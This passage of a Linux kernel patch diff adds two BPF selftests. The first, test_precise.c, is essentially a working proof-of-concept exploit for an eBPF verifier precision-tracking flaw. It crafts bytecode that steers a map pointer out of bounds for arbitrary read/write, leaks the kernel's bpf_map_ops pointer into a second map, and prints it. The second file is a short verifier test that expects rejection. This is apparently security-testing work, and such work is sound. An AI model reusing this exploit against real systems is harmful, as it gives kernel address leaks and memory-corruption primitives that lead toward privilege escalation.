+ $(OUTPUT)/xskxceiver: $(EXTRA_SRC) xskxceiver.c xskxceiver.h $(OUTPUT)/xsk.o $(OUTPUT)/xsk_xdp_progs.skel.h $(BPFOBJ) | $(OUTPUT)
+diff --git a/tools/testing/selftests/bpf/test_precise.c b/tools/testing/selftests/bpf/test_precise.c
+new file mode 100644
+index 000000000000..8d3fe278579c
+--- /dev/null
++++ b/tools/testing/selftests/bpf/test_precise.c
+@@ -0,0 +1,186 @@
++#include <linux/bpf.h>
++#include <errno.h>
++#include <string.h>
++#include <stdio.h>
++#include <unistd.h>
++#include <sys/syscall.h>
++#include <sys/socket.h>
++#include <netinet/in.h>
++#include "../../../include/linux/filter.h"
++
++char logbuf[1024*1024];
++char data_in[1024], data_out[1024], ctx_in[1024], ctx_out[1024];
++extern int errno;
++
++static int setup_listener_sock();
++static int setup_send_sock();
++
++#define STORAGE_PTR_REG     BPF_REG_3
++#define CORRUPTED_PTR_REG   BPF_REG_4
++#define SPECIAL_VAL_REG     BPF_REG_5
++#define LEAKED_VAL_REG      BPF_REG_8
++
++#define STORAGE_MAP_SIZE (8192)
++
++int main(){
++
++	// Create map for out-of-bound access
++	unsigned long long key = 0;
++    union bpf_attr corrupt_map = {
++        .map_type = BPF_MAP_TYPE_ARRAY,
++        .key_size = 4,
++        .value_size = STORAGE_MAP_SIZE,
++        .max_entries = 1,
++    };
++
++    strcpy(corrupt_map.map_name, "corrupt_map");
++    int corrupt_map_fd = syscall(SYS_bpf, BPF_MAP_CREATE, &corrupt_map, sizeof(corrupt_map));
++    if (corrupt_map_fd < 0)
++        return 0;
++
++	// Set up the second, valid map in which we can store information
++    key = 0;
++    union bpf_attr storage_map = {
++        .map_type = BPF_MAP_TYPE_ARRAY,
++        .key_size = 4,
++        .value_size = STORAGE_MAP_SIZE,
++        .max_entries = 1
++    };
++    strcpy(storage_map.map_name, "storage_map");
++    int storage_map_fd = syscall(SYS_bpf, BPF_MAP_CREATE, &storage_map, sizeof(corrupt_map));
++    if (storage_map_fd < 0) {
++        return 0;
++	}
++
++
++	struct bpf_insn progBytecode[] = {
++        BPF_MOV64_IMM(BPF_REG_2, 1000),
++        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
++        BPF_ALU64_IMM(BPF_DIV, BPF_REG_2, 3),
++        BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 0, 2),
++        BPF_ST_MEM(BPF_DW, BPF_REG_3, -120, 200),
++        BPF_JMP_IMM(BPF_JA, 0, 0, 1),
++		BPF_ST_MEM(BPF_DW, BPF_REG_3, -120, -0x110),
++        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_3, -120),
++        /* Load the corrupt map */
++        BPF_MOV64_IMM(BPF_REG_0, 0),
++        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),
++        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
++        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
++        BPF_LD_MAP_FD(BPF_REG_1, corrupt_map_fd),
++        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
++        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
++        BPF_EXIT_INSN(),
++        // Trigger arbitrary read/write
++        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),
++        BPF_ALU64_REG(BPF_ADD, BPF_REG_7, BPF_REG_6),
++        // Access map-0x110
++        BPF_LDX_MEM(BPF_DW, LEAKED_VAL_REG, BPF_REG_7, 0),
++        // Save the leaked bpf_map_ops into the second map
++        BPF_MOV64_IMM(BPF_REG_0, 0),    
++        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4), 
++        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),   
++        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),  
++        BPF_LD_MAP_FD(BPF_REG_1, storage_map_fd),  
++        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),    
++        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),  
++        BPF_EXIT_INSN(),    
++        BPF_MOV64_REG(STORAGE_PTR_REG, BPF_REG_0),  
++        BPF_STX_MEM(BPF_DW, STORAGE_PTR_REG, LEAKED_VAL_REG, 0),
++ 		BPF_MOV64_IMM(BPF_REG_0, 0),
++        BPF_EXIT_INSN(),
++};
++
++    union bpf_attr progAttr;
++    memset(&progAttr, 0, sizeof(progAttr));
++    progAttr.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
++    progAttr.license = (__u64)"Dual BSD/GPL";
++    progAttr.log_level = 2;
++    progAttr.log_size = 1024*1024;
++    progAttr.log_buf = (__u64)logbuf;
++    progAttr.insns = (__u64)progBytecode;
++    progAttr.insn_cnt = sizeof(progBytecode)/sizeof(struct bpf_insn);
++	progAttr.prog_flags = BPF_F_TEST_RND_HI32|BPF_F_TEST_STATE_FREQ;
++
++    errno = 0;
++    int fd = syscall(SYS_bpf, 0x5, &progAttr, sizeof(progAttr));
++    printf("%s\n%s\n", logbuf, strerror(errno));
++
++	/*
++    union bpf_attr attr;
++    memset(&attr, 0, sizeof(attr));
++    attr.test.prog_fd = fd;
++    attr.test.data_size_in = sizeof(data_in);
++    attr.test.data_size_out = sizeof(data_out);
++    attr.test.data_in = (__aligned_u64)data_in;
++    attr.test.data_out = (__aligned_u64)data_out;
++    errno = 0;
++    int ret = syscall(SYS_bpf, 10, &attr, sizeof(attr));
++    printf("BPF_PROG_TEST_RUN returns %d, %s, fd:%d\n", ret, strerror(errno), fd);
++	*/
++
++	int listener_sock = setup_listener_sock();
++    int send_sock = setup_send_sock();
++    if (listener_sock < 0 || send_sock < 0) {
++        return 0;
++	}
++    if (setsockopt(listener_sock, SOL_SOCKET, SO_ATTACH_BPF, &fd,
++               sizeof(fd)) < 0) {
++        return 0;
++    }
++    // trigger execution by connecting to the listener socket
++    struct sockaddr_in serverAddr;
++    serverAddr.sin_family = AF_INET;
++    serverAddr.sin_port = htons(1337);
++    serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);
++    // no need to check connect, it will fail anyways
++    connect(send_sock, (struct sockaddr *)&serverAddr, sizeof(serverAddr));
++    close(listener_sock);
++    close(send_sock);
++
++	unsigned long lk[STORAGE_MAP_SIZE / sizeof(long long)];
++    memset(lk, 0, sizeof(lk));
++    key = 0;
++	union bpf_attr lookup_map = {
++        .map_fd = storage_map_fd,
++        .key = (unsigned long long)&key,
++        .value = (unsigned long long)&lk
++    };
++    int err = syscall(SYS_bpf, BPF_MAP_LOOKUP_ELEM, &lookup_map, sizeof(lookup_map));
++    if (err < 0) {
++        return 0;
++	}
++
++	printf("storage map value: %lx\n", *lk);
++	return 0;
++}
++
++static int setup_listener_sock()
++{
++    int sock_fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK | SOCK_CLOEXEC, 0);
++    if (sock_fd < 0) {
++        return sock_fd;
++    }
++
++    struct sockaddr_in serverAddr;
++    serverAddr.sin_family = AF_INET;
++    serverAddr.sin_port = htons(1337);
++    serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);
++
++    int err = bind(sock_fd, (struct sockaddr *)&serverAddr, sizeof(serverAddr));
++    if (err < 0)
++        return err;
++
++    err = listen(sock_fd, 32);
++    if (err < 0)
++        return err;
++
++    return sock_fd;
++}
++
++
++static int setup_send_sock()
++{
++    return socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
++}
++
+diff --git a/tools/testing/selftests/bpf/verifier/atomic_precision.c b/tools/testing/selftests/bpf/verifier/atomic_precision.c
+new file mode 100644
+index 000000000000..49ebf97a03e8
+--- /dev/null
++++ b/tools/testing/selftests/bpf/verifier/atomic_precision.c
+@@ -0,0 +1,19 @@
++{
++  "atomic_fetch_or: precision marking test",
++  .insns = {
++	BPF_CALL_REL(1),
++    BPF_EXIT_INSN(),
++	BPF_MOV64_IMM(BPF_REG_1, 1000),
++    BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
++    BPF_STX_MEM(BPF_DW, BPF_REG_3, BPF_REG_1, -120),
++    BPF_MOV64_REG(BPF_REG_7, BPF_REG_10),
++    BPF_ATOMIC_OP(BPF_W, BPF_OR | BPF_FETCH, BPF_REG_10, BPF_REG_7, -120),
++    BPF_ALU32_REG(BPF_OR, BPF_REG_7, BPF_REG_3),
++	BPF_MOV64_IMM(BPF_REG_0, 0),
++    BPF_EXIT_INSN(),
++  },
++  .result  = REJECT,
++  .errstr = "R7 32-bit pointer arithmetic prohibited",
++  .result_unpriv = REJECT,
++  .errstr_unpriv = "loading/calling other bpf or kernel functions are allowed for CAP_BPF and CAP_SYS_ADMIN",
++},
+-- 
+2.25.1
+
